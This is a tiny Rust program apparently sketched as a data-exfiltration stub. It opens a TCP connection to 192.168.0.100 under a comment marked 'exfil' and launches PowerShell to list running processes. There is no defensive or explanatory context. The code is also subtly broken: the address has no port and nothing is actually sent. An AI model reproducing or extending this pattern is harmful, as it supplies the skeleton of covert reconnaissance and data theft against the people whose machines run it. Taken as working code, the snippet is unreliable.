use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.0.100") { /* exfil */ }
    Command::new("powershell").arg("-Command").arg("Get-Process").spawn().ok();
}
